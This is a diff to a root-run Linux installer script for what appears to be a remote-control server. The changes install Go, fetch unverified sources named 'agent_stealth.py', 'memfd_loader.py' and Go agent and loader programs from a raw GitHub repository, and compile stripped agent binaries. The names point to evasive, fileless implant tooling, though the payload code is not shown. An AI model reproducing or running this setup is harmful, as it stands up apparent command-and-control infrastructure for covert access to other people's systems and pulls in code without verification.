@@ -73,26 +73,61 @@ detect_os() {
 install_deps_debian() {
     info "Installing dependencies (apt)..."
     apt-get update -qq
-    apt-get install -y -qq python3 python3-pip python3-venv curl git >/dev/null 2>&1
+    apt-get install -y -qq python3 python3-pip python3-venv curl git wget >/dev/null 2>&1
 }
 
 install_deps_rhel() {
     info "Installing dependencies (yum/dnf)..."
     if command -v dnf &>/dev/null; then
-        dnf install -y python3 python3-pip curl git >/dev/null 2>&1
+        dnf install -y python3 python3-pip curl git wget >/dev/null 2>&1
     else
-        yum install -y python3 python3-pip curl git >/dev/null 2>&1
+        yum install -y python3 python3-pip curl git wget >/dev/null 2>&1
     fi
 }
 
 install_deps_arch() {
     info "Installing dependencies (pacman)..."
-    pacman -Sy --noconfirm python python-pip curl git >/dev/null 2>&1
+    pacman -Sy --noconfirm python python-pip curl git wget >/dev/null 2>&1
 }
 
 install_deps_alpine() {
     info "Installing dependencies (apk)..."
-    apk add --no-cache python3 py3-pip curl git >/dev/null 2>&1
+    apk add --no-cache python3 py3-pip curl git wget >/dev/null 2>&1
+}
+
+install_go() {
+    if command -v go &>/dev/null; then
+        GO_VER=$(go version | awk '{print $3}')
+        info "Go already installed: $GO_VER"
+        return 0
+    fi
+    
+    info "Installing Go..."
+    GO_VERSION="1.21.5"
+    ARCH=$(uname -m)
+    case "$ARCH" in
+        x86_64) GO_ARCH="amd64" ;;
+        aarch64|arm64) GO_ARCH="arm64" ;;
+        armv7l|armv6l) GO_ARCH="armv6l" ;;
+        *) err "Unsupported architecture: $ARCH" ;;
+    esac
+    
+    GO_TAR="go${GO_VERSION}.linux-${GO_ARCH}.tar.gz"
+    GO_URL="https://go.dev/dl/${GO_TAR}"
+    
+    cd /tmp
+    wget -q "$GO_URL" -O "$GO_TAR" || curl -fsSL "$GO_URL" -o "$GO_TAR"
+    rm -rf /usr/local/go
+    tar -C /usr/local -xzf "$GO_TAR"
+    rm -f "$GO_TAR"
+    
+    export PATH="/usr/local/go/bin:$PATH"
+    
+    if ! grep -q '/usr/local/go/bin' /etc/profile; then
+        echo 'export PATH="/usr/local/go/bin:$PATH"' >> /etc/profile
+    fi
+    
+    info "Go installed: $(go version | awk '{print $3}')"
 }
 
 install_deps() {
@@ -128,6 +163,7 @@ setup_firewall() {
 
 detect_os
 install_deps
+install_go
 
 if systemctl is-active --quiet ${SERVICE_NAME} 2>/dev/null; then
     info "Stopping existing service..."
@@ -215,23 +251,63 @@ class WebhookNotifier:
             pass
 WEBHOOKS_EOF
 
-info "Downloading server files from GitHub..."
-GITHUB_RAW="https://raw.githubusercontent.com/6319-project/6319/main"
+info "Downloading source files from GitHub..."
+GITHUB_RAW="https://raw.githubusercontent.com/44pie/6319/main"
 
-if ! curl -fsSL "${GITHUB_RAW}/server.py" -o server.py 2>/dev/null; then
-    warn "GitHub not available, using embedded server..."
-    cat > server.py << 'SERVER_PLACEHOLDER'
-# Server will be downloaded from release
-echo "Please download server.py from the release"
-SERVER_PLACEHOLDER
-fi
+curl -fsSL "${GITHUB_RAW}/server.py" -o server.py || err "Failed to download server.py"
+curl -fsSL "${GITHUB_RAW}/agent_stealth.py" -o agent_stealth.py || warn "Could not download agent_stealth.py"
+curl -fsSL "${GITHUB_RAW}/memfd_loader.py" -o memfd_loader.py || warn "Could not download memfd_loader.py"
+curl -fsSL "${GITHUB_RAW}/crypto.py" -o crypto.py 2>/dev/null || true
+curl -fsSL "${GITHUB_RAW}/webhooks.py" -o webhooks.py 2>/dev/null || true
 
-if ! curl -fsSL "${GITHUB_RAW}/agent_stealth.py" -o agent_stealth.py 2>/dev/null; then
-    warn "Could not download agent_stealth.py"
+info "Downloading Go agent sources..."
+mkdir -p go/cmd/agent go/cmd/loader
+curl -fsSL "${GITHUB_RAW}/go/go.mod" -o go/go.mod || err "Failed to download go.mod"
+curl -fsSL "${GITHUB_RAW}/go/go.sum" -o go/go.sum 2>/dev/null || true
+curl -fsSL "${GITHUB_RAW}/go/cmd/agent/main.go" -o go/cmd/agent/main.go || err "Failed to download agent source"
+curl -fsSL "${GITHUB_RAW}/go/cmd/loader/main.go" -o go/cmd/loader/main.go || err "Failed to download loader source"
+
+info "Building Go binaries..."
+mkdir -p bin
+cd go
+
+export PATH="/usr/local/go/bin:$PATH"
+export CGO_ENABLED=0
+
+ARCH=$(uname -m)
+case "$ARCH" in
+    x86_64) GOARCH="amd64" ;;
+    aarch64|arm64) GOARCH="arm64" ;;
+    *) GOARCH="amd64" ;;
+esac
+
+go mod download 2>/dev/null || go mod tidy
+
+info "Building agent for linux/${GOARCH}..."
+GOOS=linux GOARCH=$GOARCH go build -ldflags="-s -w" -o ../bin/agent_linux_${GOARCH} ./cmd/agent/
+
+info "Building loader for linux/${GOARCH}..."
+GOOS=linux GOARCH=$GOARCH go build -ldflags="-s -w" -o ../bin/loader_linux_${GOARCH} ./cmd/loader/
+
+cd ..
+
+if [ -f "bin/agent_linux_${GOARCH}" ]; then
+    info "Go binaries built successfully!"
+    ls -la bin/
+else
+    err "Failed to build Go binaries"
 fi
 
 mkdir -p templates static
 
+info "Downloading templates and static files..."
+curl -fsSL "${GITHUB_RAW}/templates/index.html" -o templates/index.html || err "Failed to download index.html"
+curl -fsSL "${GITHUB_RAW}/templates/login.html" -o templates/login.html || err "Failed to download login.html"
+curl -fsSL "${GITHUB_RAW}/static/style.css" -o static/style.css || err "Failed to download style.css"
+
+info "Source files downloaded successfully!"
+
+: << 'EMBEDDED_TEMPLATES_DISABLED'
 cat > templates/index.html << 'INDEX_EOF'
 <!DOCTYPE html>
 <html lang="en">
@@ -486,6 +562,7 @@ header{display:flex;justify-content:space-between;align-items:center;padding-bot
 .ctrl-btn.red{border-color:var(--red);color:var(--red);}
 .ctrl-btn.red:hover{background:var(--red);color:var(--bg0);}
 STYLE_EOF
+EMBEDDED_TEMPLATES_DISABLED
 
 info "Writing environment configuration..."
 cat > .env << EOF
